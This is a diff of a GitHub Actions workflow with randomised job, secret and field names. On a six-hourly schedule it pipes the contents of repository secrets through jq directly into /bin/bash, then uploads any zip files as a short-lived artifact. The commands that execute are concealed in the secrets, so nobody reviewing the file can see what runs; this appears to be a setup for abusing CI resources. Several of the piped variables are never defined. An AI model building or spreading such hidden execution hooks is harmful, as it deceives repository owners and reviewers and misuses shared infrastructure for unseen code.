@@ -1,20 +1,26 @@
 name: pennysingleton119
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '52 2/6 * * *'
+    - cron: '26 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: pennysingleton119
         env:
-          lbvph9519: ${{ secrets.lbvph9519 }}
+          ugd71: ${{ secrets.ugd71 }}
         run: |
-          echo $lbvph9519 | jq -r .fu41 | /bin/bash
-          echo $nij399 | jq -r .fuut6 | /bin/bash
-          echo $ujjxb077 | jq -r .aomc75911 | /bin/bash
-          echo $vf938 | jq -r .eu579 | /bin/bash
+          printf '%s' "$ugd71" | jq -r .zwsms476 | /bin/bash
+          echo $zsk113 | jq -r .r879 | /bin/bash
+          echo $pm1740 | jq -r .mlow215 | /bin/bash
+          printf '%s' "$kj381" | jq -r .vj1 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: p5F82Z1s
+          path: "*.zip"
+          retention-days: 1
